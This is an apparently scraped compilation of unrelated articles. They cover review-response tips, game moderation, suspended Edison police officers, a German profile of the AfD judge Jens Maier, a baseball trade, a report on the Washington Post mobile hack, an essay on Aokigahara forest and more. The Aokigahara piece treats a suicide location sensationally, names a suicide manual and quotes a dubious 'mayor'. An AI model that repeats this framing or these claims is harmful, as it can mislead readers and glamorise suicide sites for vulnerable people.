Why it works: Pet parents can be extremely vocal and opinionated. There will always be people who are going to be convinced that their vets are just “in it for the money” and don't really care about the welfare of their animals. In response to the negative Facebook review, Forest Grove Veterinary Clinic posted a classy reply that highlighted the company's values while also directly addressing the customer's experience.
Travel and Hospitality Negative Review Response Example
JetBlue Airways' Twitter account serves as one of the company's main customer service channels. When a customer named Esaí Vélez complained (politely) about his backseat TV not working, JetBlue responded within minutes.
Why it works: The swiftness with which JetBlue responded is impressive. While it's a response to a tweet instead of to a review, the short reply effectively displays sympathy while also offering a solution (or at least a genuine attempt to make amends).
Says best-selling author and customer service expert Chip Bell: “In the customer's mind the clock starts when he or she posts a negative review, and your reputation drops with every hour you delay providing a response. Bad reviews that remain unanswered signal to other customers you are disinterested. It also fuels the perception that the negative report by an angry customer was probably accurate.”
Best Practices When Responding to Negative Reviews
Respond in a timely manner
As mentioned earlier, more than 50 percent of customers who have written reviews expect a response in seven days or less.
1 in 4 have an even shorter time frame: they expect to hear back from the business within three days.
Set up review alerts so you are notified of new reviews. Also, you definitely don't want to be logging in and out of every review site manually — so a review response tool may be useful.
Remember: the clock begins ticking once reviews are posted, and customers are waiting to hear back from you.
Assign ownership of the process
Identify people in your organization who will be directly involved with responding to bad reviews. This is actually complicated, because reviews live at the intersection of marketing, operations, social media, and customer service. There are a lot of stakeholders.
Typically speaking, we see that branch or location managers, social media teams, marketing teams, and customer service staff are typically the people who are put in charge of review response.
Clarifying who is in charge of responding to reviews is important not just because it simplifies the process—it will also increase your review response time, a key customer success metric.
Whoever steps up as the head of your review response program should understand the guidelines of each review site, be able to transform the collected feedback into valuable insights for your company, and — perhaps most important of all — display the right tact needed to address complaints and represent the brand well.
Create a review response policy
If you operate in multiple locations, chances are more than one person will be assigned to respond directly to online reviews.
This makes it crucial to have an organization-wide policy that guides how your company should proceed whenever new customer reviews are posted online.
Your policy should cover things like what language and tone you should use, what the timeline is for getting back to customers, with whom the reviews will be shared in your organization, when do escalations become necessary, what the ideal response rate is, and other items that may affect how your company handles reviews.

It's a sign that things have got out of hand when you start offering people rewards for staying within the law. Riot Games' recent decision to give exclusive League of Legends character skins to those who hadn't been banned in the previous 12 months has the air of a dystopian future where good people get sent to prison because it's the safest place going.
MOBAs have long been the world's greatest source for creative takes on being told to kill yourself—the intense need for teamwork, huge time commitment and highly specific tactics becoming the crucible in which anonymous internet dicks are forged. But with the meteoric rise in popularity of online games as a spectator sport, companies are forced more and more to consider how to keep their chatlogs as clean as their bugfix lists.
“Curbing bad behaviour is a constant battle for many game developers,” says Hi-Rez Studios' Austin Gallman. “A lot of research has gone into finding the best ways to do this. I don't feel that anyone has really found the perfect solution yet, but having a punishment/reward system certainly helps.”
It seems that the traditional system of temporary and permanent bans simply isn't effective enough in a world where games have the populations of countries, and where players—so often spun into a frenzy of competitive ire—have the mouths not just of potties, but of entire sewage reservoirs.
For a company like Hi-Rez, the problems become clear when you look at its games slate. With even automated ban systems requiring a human support response, and players from across the world working their way onto the naughty list, multilingual teams need to be assembled, growing as the games do. That's not to mention the different kinds of bad behaviour that different games engender.
“MOBAs are typically more team-oriented,” Gallman explains, “so we've seen a bit more in the way of poor behaviour with Smite than we did with our shooter titles. Cheating, however, is a different story entirely. Attempts at cheating were much more common in our shooters.” Working on online games for so long has helped Hi-Rez cultivate a good sense, and an efficient system, for punishing infractions, but the tide now seems to be turning towards a more holistic approach.
“Obviously, it is near impossible to eliminate bad behaviour in games entirely,” Gallman adds, “but cultivating a fun gaming environment is always step one. We also think it is important to model positive behaviour via Twitch.TV streaming of the game, game-oriented video content, and other community oriented activities.”
Riot's Pavlovian “be good, get nice things” approach is the kind of positive-reinforcement ethos that the industry seems to be pushing.
Simply teaching people that good behaviour is the norm, and creating role models for younger players, could be the way forward for an industry plagued by literal problem children—and including Riot's Pavlovian “be good, get nice things” approach is the kind of positive-reinforcement ethos that the industry seems to be pushing for as of late.
But it's by no means the only way—at least not if you ask CCP. The EVE Online developer's famously laissez-faire attitude to its bewilderingly enormous universe extends to its punishment policies, too. In a joint statement, Sigurður Ævarsson and Davíð Einarsson, men with the privilege of having the job titles of senior and lead game master respectively, explain: “Many actions lie outside what we consider to be fair play, especially with regards to socially unacceptable behaviour, but EVE Online remains unique in the sense that we have an extremely relaxed ruleset that governs the way the game is played. Many actions that would be a bannable offence in other MMOs are often considered fair game in EVE.”
Theft, corporate espionage, piracy—this is the stuff of EVE legend, and the kind of high-level assholery that would have you out of most online games at the push of a Del key. In the cutthroat world of Icelandic space warfare, however, it's par for the course. Accepted wisdom would have it that lugging around a cargo bay filled with real cash is just begging to have it stolen by either other players or the cruel pull of the void.
This doesn't mean that anything and everything goes—CCP's ban protocols are regularly updated and robustly enforced, and, as they put it, “our players are extremely creative, and often find ways to breach our policies in ways that we could never imagine” (see the above boxout for more on that). The key to EVE's relatively sedate community is acceptance of the fact that it's not the developers who will cause you problems should you ever step out of line, it's the other people playing the game.
Ævarsson and Einarsson again: “Promoting largescale warfare and violence in EVE Online is a large part of the game. Regardless of this, for the most part our community remains extremely close-knit, civil and friendly toward one another. This tends to be due to the fact that in EVE, reputation is everything, and can make or break your career in New Eden. With this in mind, our community tends to police itself. EVE players are free to use any in-game tools to wage war and aggress each other, and we recommend that they resolve their differences within the game environment.”
While the methods taken are wildly different, there's a parity between Hi-Rez and CCP's approaches, and one that marks the biggest swing in policing online gaming. Whether it's by staying hands off or reminding players that playing nice is the way to have more fun, both companies are creating a status quo, boundaries that players can understand intuitively simply by participating in the community enough. To co-opt the words from some old book: give a man a ban and he'll be salty for a day. Teach a man what will stop him getting banned and, with any luck, we'll all avoid our grim prison-planet future.
[Correction: A previous version of this article erroneously placed CCP about 2,200 km east of Reykjavík, Iceland.]
In what amounts to a long vacation at taxpayer expense, two Edison police officers continue to draw hefty salaries more than a year after they were suspended amid allegations of impropriety.
Patrolmen Anthony Sarni, who earns $120,000 annually, and David Pedana, who makes $89,000, were suspended in October 2013 over unrelated episodes of alleged misconduct.
Sarni, while still in uniform after the completion of his shift, returned to the scene of a 911 call at an Edison hotel, where he allegedly tried to coerce a woman to have sex with him. The woman rebuffed the 40-year-old officer and filed a complaint, authorities have said.
Pedana, 35, is accused of sending text messages that contained numerous racial epithets, including some directed at fellow officers.
Township officials signaled their intention to fire the two in May of this year, sending the officers letters saying they were entitled to defend themselves at departmental disciplinary hearings.
But those hearings, akin to trials, have yet to take place. Moreover, they haven't even been scheduled, according to members of the department.
“My God, that's a good gig if you can get it,” Edison Councilman Wayne Mascola said. “We're not talking chump change here. We all know what kind of money these officers make. Something has to be done for the taxpayers' sake.”
Mascola added that because he didn't know what kind of evidence exists against the officers, he wasn't advocating for their dismissal. But he urged Mayor Thomas Lankey, the township's public safety director, to move more swiftly in scheduling disciplinary hearings.
“A decision has to be made, and we have to move on,” Mascola said. “It's been 13 months. Why are we waiting around on this?”
Lankey declined to be interviewed for this story. In an emailed statement, he addressed the circumstances that required the township to pay the officers during their suspensions. The statement did not say why hearings have yet to be held.
“In the private sector, employees who are accused of wrongdoing can be suspended without pay pending an inquiry or they can simply be terminated,” Lankey said. “The public sector – in our case, municipal government – is constrained by state statute, case law and union contracts.”
Under state rules, police officers must continue to receive pay while suspended unless they're charged with a duty-related fourth-degree crime, a crime of the third degree or higher, or a crime of moral turpitude. While Sarni and Pedana face multiple administrative counts, they were not charged with crimes.
Pedana could not be reached for comment. An attorney for Sarni did not return several phone calls.
Such lengthy suspensions with pay are not unprecedented, but they are rare, said Wayne Fisher, a former deputy director in the state Division of Criminal Justice and now a professor at Rutgers University's Graduate School of Criminal Justice.
A police officer in Coconut Creek, Fla., returned to work last year after a suspension of nearly 18 months, according to published reports. In Georgia, seven police officers were placed on desk duty for several years while continuing to collect full pay, the Atlanta Journal-Constitution reported in 2009.
In the Edison case, Fisher said it is within the mayor's purview to continue paying the officers, but he said Lankey should publicly explain why the suspension has dragged on.
“He has a responsibility to the people of Edison -- the taxpayers of Edison -- to say what is taking so long to bring this to a disposition,” Fisher said. “The inability or disinclination to answer that question in and of itself says something.”
Edison police Chief Thomas Bryan declined to comment on the suspensions, saying he was not at liberty to discuss personnel issues.
Sarni and Pedana are among at least six Edison officers out on suspension.
Acting Lt. William Gesell and two patrolmen, Victor Aravena and Brian Favretto, allegedly conspired with another officer, Michael Dotro, to retaliate against a North Brunswick cop who brought a drunken driving charge against one of Dotro's associates.
The four were indicted in October on a range of criminal counts related to the alleged retaliation plot, which was not carried out. In an unrelated matter, Aravena was charged with pressuring a fellow Edison officer to change a police report in May 2013.
The officers, all suspended without pay, have pleaded not guilty.
The charges against them grew out of a case that rocked the police department last year: the arrest of Dotro on charges that he tried to kill one of his superiors by setting fire to the man's house as he and his family slept inside.
The superior, Deputy Chief Mark Anderko, and his relatives escaped unharmed. Dotro faces five counts of attempted murder and other counts for the alleged arson attack.
In the wake of Dotro's arrest, the Middlesex County Prosecutor's Office seized cell phones from many of his colleagues to determine if any of them had advance knowledge of the fire. The alleged retaliation plot -- along with the racist text messages on Pedana's phone -- were discovered during that investigation, authorities have said.

AfD-Richter in Dresden
Herr Maier erwacht
Früher war Jens Maier in der SPD, seit 2013 ist er AfD-Mitglied. Der Mann ist Richter – und Protagonist des völkischen Parteiflügels.
DRESDEN taz | An dem Tag, an dem über die Zukunft des Richters Jens Maier entschieden wird, liegen graue Wolken über der Elbe, der getaute Schnee ist zu Harsch gefroren. Nach der Mittagspause zieht Maier, 54, die Haare licht, die Brillengläser ohne Rand, langsam einen Rollwagen voll Akten über den Flur des Landgerichts in Dresden. Es ist der 30. Januar. Maier, von unauffälliger Gestalt, trägt Robe, weißes Hemd, weiße Krawatte.
Er legt die Akten auf den Richtertisch und drückt die Aufnahmetaste seines Diktiergeräts. Ein Verkehrsunfall aus dem Jahr 2014 steht an, Schaden: 8.236 Euro. Maier zieht etwas Schnupftabak. Der Beschuldigte, ein armenischer Lkw-Fahrer, kann kaum Deutsch, die Geschädigte sich nicht mehr erinnern, wie das damals nun war. Sie gibt trotzdem dem Armenier die Schuld, widerspricht sich aber. Maier nimmt es hin, freundlich, geduldig wie ein Mediator. „Sie sind ein gefragter Mann“, sagt er, ohne Schärfe, als das Handy des Anwalts zum zweiten Mal klingelt. Die Frau sagt, dass vielleicht doch sie dem Armenier ins Auto gefahren ist. „Erledigt“, sagt Maier. Dann eben kein Schadenersatz.
„Konsenskultur“ nennt er das. „Im Gericht wollen wir, dass die Leute sich einigen.“ Draußen ist es anders. Da geht es nicht um Blechschaden, sondern um Deutschland. Und „im Politischen“, sagt Maier, herrsche „Streitkultur“, da „gilt die Freund-Feind-Unterscheidung“.
Zwei Wochen ist es her, da ist Jens Maier endgültig in diese Welt getreten. Es ist der 17. Januar, als Maier klarstellt, wer sein Freund ist: Thüringens AfD-Chef und Partei-Rechtsaußen Björn Höcke. Und „das ist natürlich eine Kriegserklärung an zig andere“. Zum Beispiel an die AfD-Vorsitzende und Höcke-Gegnerin Frauke Petry, auch sie ist aus Dresden.
Einheizer für Björn Höcke
An jenem 17. Januar lädt die Junge Alternative Höcke ein in das Brauhaus Watzke in Dresden, die „Hauptstadt des Widerstands“, wie sie es nennt. Als Einheizer verpflichtet sie Maier. „Wir haben es da schon richtig krachen lassen“, sagt Maier später über den Abend. Draußen demonstrieren Grüne und Antifas, drinnen sitzen Pegidisten bei Altpieschner Pilzgulasch und Watzke-Pils. „Wir Deutschen sind das einzige Volk der Welt, das sich ein Denkmal der Schande in das Herz seiner Hauptstadt gepflanzt hat“, sagt Höcke. Das macht Schlagzeilen. Maier aber geht weiter: Den Deutschen sei „nach 1945 vor allem von den Westalliierten eingeredet worden, dass wir Sauhunde, Verbrecher, nichts wert sind“, sagt er. Er klagt über „Umerziehung“, nach der „­Auschwitz praktisch die Folge der deutschen Geschichte wäre“. Er raunt von einer „Zuspitzung der Verhältnisse“, die „bald eintreten wird“, beklagt die „Herstellung von Mischvölkern“, die die „nationale Identität auslöschen und dann die Abgabe der Souveränität an die EU“ folgen lassen. Und dann erklärt er „hiermit diesen Schuldkult für beendet, für endgültig beendet“.
Die AfD Sachsen setzt ihn dafür zehn Tage später auf Platz 2 ihrer Landesliste – gegen den Willen Petrys. Im Bundestag ist er so fast sicher. Petry will ihn aus der Partei werfen lassen, wird dafür aber heftig angefeindet, ihr entgleiten weite Teile der sächsischen Parteibasis.
Politologe Steffen Kailitz „Der Einfluss des rechtsextremen, völkischen Partei­flügels wächst“
Maier stammt aus Bremen, bis 1986 ist er dort in der SPD. Die ist heute für ihn nur noch „Instrument der Asylindustrie und der Bankerlobby“. 1991 zieht er nach Dresden, 1997 kommt er an das Landgericht, 2013 zur AfD.
Is Morgen des Tages, an dem Höcke und Maier im Watzke das Ende deutscher Nationalschuld ausrufen, weist das Bundesverfassungsgericht den NPD-Verbotsantrag des Bundesrats zurück. „Ich nehme an, dass viele der Kameraden jetzt am Feiern sind“ – so beginnt Maiers Rede im Watzke.
Darf so jemand politische Verfahren führen?
Das Verbotsverfahren hatte ihm Bekanntheit gebracht. Sachverständiger dort war der Dresdner Politologe Steffen Kailitz. Der wirft der NPD vor, „Millionen deutscher Staatsbürger mit Migrationshintergrund“ vertreiben zu wollen. Die NPD verklagt ihn deshalb – am Landgericht Dresden. Zuständig für das Verfahren: Jens Maier. Is 10. Mai 2016 entscheidet er, dass Kailitz seinen Befund über die NPD nicht wiederholen darf. Im Watzke nennt Maier die NPD „die einzige Partei, die immer geschlossen zu Deutschland gestanden hat“. Wegen „Nazi-Nostalgie“ sei sie allerdings „nicht zukunftsfähig“. Doch jetzt, sagt Maier, „sind wir da, die neue Rechte“.
„Maiers Radikalisierung ist für mich keine Überraschung“, sagt Kailitz heute. Als die Klage der NPD gegen ihn läuft, entdeckt er unter Maiers zwischenzeitlich offenbar gesäuberter Liste mit Facebook-Freunden führende NDP-Politiker. Seit dem Abend im Watzke sei eine Radikalisierung der sächsischen AfD „klar zu beobachten“, sagt Kailitz. Maier sei mittlerweile eine zentrale Figur im Landesverband, wichtiger Protagonist des völkischen Flügels.
Darf so jemand als Richter politische Verfahren führen? Nach der Rede im Brauhaus „war natürlich gleich Krisensitzung“, sagt Maier. Das Landgericht prüft, ob er gegen das sogenannte Mäßigungsgebot für Richter – also die Pflicht, sich so zu verhalten, dass das Vertrauen in die Unabhängigkeit des Amtes nicht gefährdet wird – verstoßen hat. „Hoffentlich bleibe ich Richter“, sagt Maier bei einer AfD-Veranstaltung. Die entscheidende Sitzung des Gerichtspräsidiums ist am Abend des 30. Januar.
Auf Fragen keine Antworten
Kurz davor endet die Verhandlung gegen den Lkw-Fahrer. Maier packt zusammen. „Sie sind wegen dem Nazi-Richter hier, stimmt's“?, fragt er. Immerhin. Die Presse wolle ja nie mit ihm reden. Die Sache mit dem Abend im Brauhaus Watzke sei vor allem ein Missverständnis, sagt er. Aufgebauscht. Eine Kampagne der Medien gegen die AfDler, die keine Profis, sondern „nur eine Laienspielschar“ seien. Es gäbe viel, was man ihn fragen wollte. Wie er eigentlich so geworden ist, das vor allem. Doch Maier lehnt ab. Alles werde immer aus dem Zusammenhang gerissen. Schriftlich könnte er antworten. Aber Antworten auf die Fragen kommen nie. Mails und Anrufe ändern daran nichts.
Is Abend entscheidet das Gerichtspräsidium: Maier bleibt Richter. „Wir haben den Geschäftsverteilungsplan geändert“, sagt der Sprecher Thomas Ziegler. Prozessbeteiligte, so das Gericht, hätten Zweifel, dass Maier als AfDler „unbefangen“ über „stark politisch geprägte Fragen“ richten könne. Maier darf jetzt keine Mediensachen und Klagen wegen Verletzung des Rufes und der Ehre verhandeln. „Auch zu seinem Schutz“, sagt Ziegler. „Es ist ja ungünstig wenn man wegen Befangenheit abgelehnt wird.“
Maier kann die Radikalisierung der Partei, die Gauland von oben betreibt, von nun an ungehindert an die sächsische Basis bringen. Hier füllt er offensiv die Leerstelle am rechten Rand, die die sich gemäßigt gebende Petry lässt. Er zeigt sich mit Höcke, nennt ihn „meine Hoffnung“ und führt die AfD in ihrem Kernland Sachsen so weg von Petry. Er bildet ein neues Machtzentrum des „Flügels“, wie der Höcke-Trupp sich nennt.
Im März nennt Maier Migration „umgekehrte Kolonialisierung“. Statt Kanonen hätten die Migranten heute Bilder wie das des Toten syrischen Jungen Aylan Kurdi, „um uns auszubeuten“. Das sei „die Strategie der Kriegsführung, die die fahren“. Von so erzeugtem „moralischen Gewäsch“ dürften „wir uns unser Land nicht kaputt machen lassen.“ Im April hört ein Zeit-Reporter, wie Maier bei einer Veranstaltung bei Pirna sagt, der norwegische Rechtsterrorist Anders Breivik sei „aus Verzweiflung heraus zum Massenmörder geworden“, ob der Einwanderung von „Kulturfremden“. Petry nennt dies eine „beispiellose Geschmacklosigkeit“ und beantragt Maiers Parteiausschluss. Die Basis tobt. Maier unterläuft Petrys Bemühen um bürgerliche Anschlussfähigkeit jetzt gezielt: Im Juni tritt Maier bei Pegida auf, nennt die Anwesenden „Freunde“ und wirft Petry „Abgrenzeritis von Pegida“ vor. Freund-Feind-Unterscheidung.
Die Dresdner AfD hält zu ihm
Im August fordert er auf dem Dresdener Neumarkt unter „Maier, Maier“-Rufen des Publikums „dass Deutschland wiederaufersteht“. Die Dresdner AfD steht zu ihm. Die einen wegen seiner radikalen Töne, die anderen glauben, dass er alles nicht so meint. An einem Freitag im September hat der Ortsverband einen Stand vor der Universität aufgebaut. Höcke und Maier „die stehen für Bismarck und für Deutschland und lassen sich nicht vom Zeitgeist verbiegen“, sagt Hans-Joachim Klaudius. Warum Maier keine Interviews gebe? Die Situation nach dem Abend im Watzke sei für Maier „schwierig“ gewesen. „Er wollte eben keine Fehler machen“, sagt Klaudius. „Er hat keine Fehler gemacht“, sagt ein Dabeistehender.
Ein alter Mann kommt zum Stand. Er will einen „Aufkleber vom Maier“. Er war Elektroingenieur, den Namen „kann ich nicht sagen, es gibt ja keine Sicherheit in diesem Land mehr“. Nach der Wende habe er die CDU gewählt. Aber das sei nicht mehr möglich. „Dieser Staat hat total versagt“, nicht nur in der Flüchtlingspolitik, „auch bei Schule und Familie“. Die FDP „hat die Homosache so hochgespielt, wenn die jungen Leute so was sehen, dann sagen die doch, das will ich auch ausprobieren. Das ist doch nicht normal. Wenn es keine Familie gibt, gibt es keine Kinder. Aber das will dieser Staat ja auch gar nicht mehr. Der holt hier lieber die Neger rein.“
Daneben steht Michael Baitinger, ein Chemiker am Max-Planck-Institut, früher Linker, heute „weder links noch rechts“, sagt er. Als er in die AfD eintrat, hatte er Zweifel, ob die Partei ihn, Mann einer Taiwanesin, mit einem gemeinsamen Sohn, akzeptieren würden. Doch das sei geschehen. Für ihn ein Beleg, dass die AfD „multiethnisch“ sei, „im Unterschied zur NPD“. Maiers Rede hat ihn irritiert. „Ich habe ihn gefragt, ob er ein ethnisch homogenes Deutschland will.“ Maier verneinte, sagt Baitinger. „Es war sehr vernünftig, ohne Radikalität, hat sich stark abgegrenzt zum ethnischen Nationalismus.“ Er fühle sich „missverstanden“, habe er Baitinger gesagt. „Ich habe ihm gesagt, so jemand müsste in der Lage sein, sich klar auszudrücken.“ Aber in einer Partei müssten ja auch nicht immer alle einer Meinung sein.
So lässt der gemäßigte Teil der Partei Maier und Höcke gewähren. „Der Einfluss des rechtsextremen, völkischen Flügels wächst“, sagt Kailitz. Wie weit, ist offen. Nur Frauke Petry, glaubt er, werde aufgrund der Kräfteverhältnisse „keine Zukunft in der Partei“ haben.
Billy Beane had to make this trade.
The Oakland A's might not be in this position a year from now, let alone three years or five or 10. The's have been the best team in baseball in this season of parity, a season without a clear title favorite. But the A's had a flaw -- or the potential for one -- and Beane couldn't afford to let his team whither as the rotation slowly disintegrated.
So give him credit for having the guts to trade 20-year-old Double-A shortstop Addison Russell and Class A outfielder Billy McKinney to the Cubs for two-fifths of a championship rotation in Jeff Samardzija and Jason Hammel. Those two will join Scott Kazmir and Sonny Gray and whoever holds down the fifth spot to now give the A's maybe the best rotation in the American League to go with what has been the league's most potent offense.
The rotation leads the AL in ERA, a surprising development given the season-ending injuries to Jarrod Parker and A.J. Griffin in spring training, but has been progressively worse each month since a blistering April. Given that Gray and Jesse Chavez have never pitched a full season in a big league rotation and Kazmir hasn't pitched more than 158 innings since 2008, there was also concern about the rotation wearing down.
Now Beane has added two guys currently sporting ERAs under 3.00 with excellent peripherals. Yes, trading a cheap, team-controlled potential star such as Russell, a top-10 prospect entering the season, is antithetical to what small-market teams with limited resources normally do, but consider that Beane might not be able to keep this core together much longer.
Josh Donaldson will start to get expensive next year, and Brandon Moss will be due for a big raise. Jed Lowrie will a free agent after this season, and perhaps most problematic, Yoenis Cespedes will be a free agent after the 2015 season.
So, yes, I love the move to go for it now. Interestingly, I had proposed on Twitter on Thursday night the idea of trading Russell for David Price. Reaction was split, though I'd say a small majority favored the A's keeping Russell.
Such is the world we live in, where prospects are coveted like gold. Russell will likely develop into a nice player; when I talked to him in spring training he came across as a quiet but confident kid with a good head on his shoulders. Donaldson praised not just Russell's talent but also his work ethic. It certainly wasn't easy for Beane to trade his shortstop of the future.
But Beane is eyeing his own gold -- the kind you put in a World Series ring. And this trade clearly makes the A's the World Series favorite.
You're going to get some bugs in your video games from time to time—that much is a given. Fortunately, they usually tend to be things like wonky save mechanics and enemies stuck in the environment rather than, say, vials of live spiders crammed into cartridges for the 1983 Nintendo Famicom console.
Yet as Kotaku reports, that's exactly what Mexico's Federal Police found yesterday at the airport in Guadalajara, Jalisco when they inspected a package bound for Hanover, Maryland. From the outside, the contents looked like 10 normal classic cartridges for games like Robocop 2 and Jurassic Park, but inside the cartridge's hollow points were 73 spiders stuffed into their own vials.
There's no word on what kind of spiders they are. But c'mon, spider smuggler. You could have at least made one of those games a dungeon crawler for laughs.
It seems to me that the act of adornment – indeed, the compulsion to adorn – is a fundamentally human impulse that speaks to our deep craving for individuality, beauty, recognition, and perhaps even provocation.
Like tattoos, wall murals are nothing new – humans have been decorating the surfaces of their bodies and their buildings for millennia, and across cultures. Whatever else you may think about sleeves and graffiti art, it is difficult to argue that the desire for such images represents some kind of aberration or passing fad.
Similarly, some of the more intellectually austere 20th century architectural paradigms – modernism, brutalism, International Style – have, to some extent, been eclipsed by contemporary design philosophies that rely on a far more varied visual, material and geometric vocabulary. The resurgent interest in the adornment of exterior walls with works of art acknowledges the vital social importance of the passerby, public space and protest art.
It's all about complex expression, which, of course, is the trait that distinguishes us from most other species.
Phlegm's mural, on the west side of the Slate Asset Management-owned office on the south-west corner of St. Clair and Yonge, is the latest piece of evidence to affirm the foregoing, but it is also one of the largest and certainly most detailed such works in Toronto to date. I've gone by it a few times now, and the experience of approaching this sitting, cosmopolitan figure is revelatory: the closer you get, the more you see.
While that Slate wall has no explicit connection to development patterns in the area per se, Phlegm's mural, interestingly, addresses itself directly to the future of the Yonge/St. Clair node, which is busy extending itself west towards Avenue Road thanks to the re-development of several office properties on the south side, plus the coming construction of a new condo behind the Deer Park United Church. The intersection itself has been conspicuously and stubbornly blah for years. The mural, however, has created a new vista and a magnet for the new residents of St. Clair West, who get to enjoy wider sidewalks, two cafes, a supermarket and a liquor store, all in one extended block.
Adornment, in short, matters, because in this case, it has produced a sense of place where there was once only a blank, well, slate.
So what's next?
My nomination, for what it's worth: that block-long south wall of the Bay store at Yonge and Bloor, whose vast expressionless brow has faced mutely across Bloor Street for over two generations.
The building, which belongs to Brookfield, dates to a period when no planner or architect would have so much as peeped in protest against a design that so shamelessly offered up the middle finger to the street below.
For years, 2 Bloor East faced a dreary row of low-slung, dumpy retail buildings, which were later replaced by utterly inexpressive grey glass office towers. But the public and use context of that intersection is changing dramatically with the arrival of two gigantic condoes towers – 1 Bloor East and then 1 Bloor West – that will produce north-and north-east facing picture windows for hundreds of apartment dwellers, whose costly views will consist of a vertical sheet of pebbly concrete.
Allowing for their gargantuan scale, both developers are using leading architects (Hariri Pontarini and Foster & Partners), who have designed textured exteriors that will be far more visually expressive and differentiated than either of the work-a-day office towers on the north-east and north-west corners. Both will demand to be seen.
And it also follows that the residents of both buildings – and by extension, the thousands of Torontonians who use that intersection daily – will come to expect something far more lively and urban from the north wall of Bloor.
A mural on The Bay's wall would also provide a theatrical backdrop for the city's two best attended parades – Santa Claus and Pride – as well as a visual anchor for the east end of the Mink Mile, which is still lacking verve despite the gazillion dollar black granite paving and all those lovely planters. In keeping with all that effort, a vivid large-scale mural would draw customers to The Bay and the area.
Mostly, the City, by leveraging the example of the Slate building and Phlegm, can offer Brookfield an opportunity to transform a deadening, self-involved, un-seeing external wall into a space to be visited, inspected, debated, and enjoyed.
A place, in short, befitting Toronto's single most important intersection, where east meets west.
Slate, Phlegm and the impressive crew at StreetArToronto have shown us how a stunning wall-sized piece of art can resurrect a public space that we long ago gave up for dead. They can, and should, perform their next act at Yonge and Bloor.

The Second Round of Artist Announcements for Summer Camp Music Festival is up, and we Camp Counselors cannot be more excited! Read on to see our favorite picks, and catch them all this Memorial Day Weekend at #SCamp16!
You can see the full lineup for Summer Camp Music Festival here.
Want to listen to all the Artists from Round One and Two? Camp Counselor Ginny has you covered!
Camp Counselor Eric Picks:
George Clinton and P-Funk
George Clinton revolutionized the R & B and funk sound during the 1970s. Over the years they've played under different monikers, both Parliament and Funkadelic. Both groups focused on certain sounds of the era, each having their own breakthroughs in hits. During the late 1980s and 90s, Clinton's music was re-established as the soundtrack for the Rap Movement, inspiring the works of many artists including Digital Underground, Dr. Dre, and Warren G. Funk Rock artists like Primus and Red Hot Chili Peppers also attribute their works of the 90s to be influenced by George Clinton. As one of the fathers of funk, Summer Camp Music Festival proudly welcomes them to this year's festival!
The Roots
The collaboration between Tariq “Black Thought” Trotter and Ahmir “Questlove” Thompson date all the way back to 1987 where they performed together at a talent show. Solidifying the name “The Roots” in 1992 and with their debut album release a year later, the group has proven to be a hip-hop act unlike any other. Known for their unique sound and having a very pioneering career, the group has proven to be a staple over the years helping define hip-hop. Currently, the band has released over ten albums and also currently stands as the house band for The Tonight Show Starring Jimmy Fallon. We welcome them to Summer Camp and cannot wait to get down!
Camp Counselor Bailey Picks:
Andy Frasco
There is never a dull moment with Andy Frasco. From the moment he hits the stage, you're guaranteed a party with his high-energy party blues! His energy and excitement is contagious. The best part is that the shows are interactive and you really never know what's going to happen. He may jump into the crowd, sometimes he has his band members do improvisational “battles” with their instruments, and he's also been known to stop and talk with fans in the audience. Not only does Frasco do extensive touring here in the states, he also performs in countries around the globe! No two shows are the same with Andy Frasco, and his group is a must-see at this year's Summer Camp!
Kung Fu
THEY'RE BACK! After giving two absolutely incredible performances at SCamp last year, this intense funk-rock group will be returning to the Festival again.

Washington Post mobile site hacked
The mobile site of the Washington Post was hacked on Thursday afternoon.
Users navigating to the site found a pop-up message box that said, "You've been hacked by the Syrian Electronic Army." As the user clicked on "OK," the message changed to "Saudi Arabia and its allies are killing hundreds of Yemens people everyday" and "The media is always lying" before being taken to a blank page with the words "Hacked by SEA."
The hack didn't seem to extend to the Post's desktop website or its social media accounts. The same group claimed responsibility for a sophisticated hack on the Washington Post's website in 2013.
The Syrian Electronic Army, a loose hacker collective that aligns itself with Syrian President Bashar al-Assad, often targets media organizations and has claimed to hack sites and social media accounts associated with IBTimes.com, CNN, The New York Times among others.
A spokesperson for the Washington Post said they are looking into the possible hack.
UPDATE (3:00pm):
Washington Post chief information officer Shailesh Prakash confirms the hack in a statement:
“The Washington Post's mobile homepage and some section fronts on the mobile site were redirected to a site that claimed to be run by the Syrian Electronic Army. The situation has been resolved and no customer information was impacted.”

Referencing Wataru Tsurumui's bestselling book “The Perfect Place to Die – The Complete Manual of Suicide”. Aokigahara is known as a dark, thick forest located at the base of Mount Fuji, now know as a popular suicide spot.
Now no one knows exactly how many bodies go undiscovered among the Mount Fuji forest, but the ones uncovered so far have already earned this place an eerie reputation. In 2002, 78 bodies were located in Aokigahara. In 2006, another 16 suicides were reported. Some of the victims even carried copies of Tsurumui's book “The Perfect Place to Die” with them, which makes this even creepier. The forest is covered with signs to plead for people to “please reconsider!” or “please consult the police before you decide to die!” but obviously these have little power on those determined to die at the base of Mount Fuji.
The mayor of Aokigahara blown away by the high number of suicides registered in the area says “We've got everything here that points to us being a death spot. Perhaps we should just promote ourselves as ‘Suicide City' and encourage people to come here”. Locals say they can always tell those of who is going into the forest to admire its amazing beauty, and those who aren't planning on ever coming back. They say part of the reason people decide to commit suicide in Aokigahara forest is because they want to die at the foot of the sacred Mt. Fuji and because it's so dense and thick it makes it hard to hear any sort of sound even from a few kilometers inside the forest.
Aokigahara is considered the most haunted place in all of Japan, where the unsettled “yurei” (ghosts) howl their suffering into the winds. The noises heard here might be considered normal in most forests, but knowing the reputation of this place, people tend to freak out at the sound of squeaky branch. Of course, there are scary stories about the trees themselves being filled with evil energy along with centuries of suicides. Legends say there are massive iron deposits underneath the forest that cause compasses and other navigation gadgets to go haywire trapping both suicidals and innocent visitors. While Japan's Self Defense Force, who regularly trains in Aokigahara says its military grade tools work just fine, they admit pretty much all commercially available equipment doesn't.
As haunted as these suicide woods may be, they still have to be taken care of by regular forestry workers. Occasionally, they stumble upon dead bodies in various states of decomposition, usually hanging by trees or partly eaten by wild animals, but instead of running the other way screaming, they are brought to a nearby station. Here they are deposited in a spare room with two beds in it – one for the body and the other for someone to sleep next to it. There is a Japanese believe that if left alone, the unsettled yurei will scream all throughout the night and move into the regular sleeping quarters, so the workers play rock-paper-scissors to determine which one will sleep with the body.

That Darn Cat! is a 1965 American Walt Disney Productions thriller comedy film directed by Robert Stevenson and starring Hayley Mills (in her last of the six films she made for the Walt Disney Studios) and Dean Jones (starring in his first film for Disney) in a story about bank robbers, a kidnapping and a mischievous cat. The film was based on the 1963 novel Undercover Cat by Gordon and Mildred Gordon. The title song was written by the Sherman Brothers and sung by Bobby Darin. The 1997 remake includes a cameo appearance by Dean Jones.
